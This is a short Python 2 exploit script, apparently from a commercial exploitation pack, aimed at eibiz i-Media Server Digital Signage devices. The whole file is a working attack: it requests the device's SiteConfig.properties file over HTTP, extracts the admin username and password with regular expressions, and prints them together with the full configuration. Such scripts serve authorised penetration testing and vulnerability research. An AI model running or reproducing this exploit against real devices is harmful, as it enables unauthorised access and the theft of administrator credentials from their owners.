#! /usr/bin/env python2
 
#
# Proprietary D2 Exploitation Pack source code - use only under the license
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2020
#

###
# STD modules
###
import os, sys, re
import requests

_name_   = 'd2sec_eibiz_1'
_vendor_ = 'eibiz'
_model_  = ['i-Media Server Digital Signage']
_vuln_   = 'Credentials Disclosure Vulnerability'
_cve_    = ''
_ref_    = 'https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5583.php'
_port_   = 80

def pwnrouter(host,port=_port_):
  try:
    url = "http://%s:%s/config/SiteConfig.properties" % (host,port)
    response = requests.get(url, verify=False)
  except Exception, e:
    print '[-] error : %s' % e
    return
  if response is None:
    print '[+] %s not vulnerable' % host
  if "admin.username" in response.text:
    user = ""
    password = ""
    print '[+] %s vulnerable' % host
    m = re.search("admin.username=(\\S+)", response.text, re.DOTALL)
    if m:
        user = m.group(1)
    m = re.search("admin.password=(\\S+)", response.text, re.DOTALL)
    if m:
        password = m.group(1)
    print('User: %s\nPassword: %s\n\n===\n\n'%(user,password))               
    print(response.text)
  else:
    print '[+] %s not vulnerable' % host


if __name__ == "__main__":
  pwnrouter(sys.argv[1], int(sys.argv[2]))
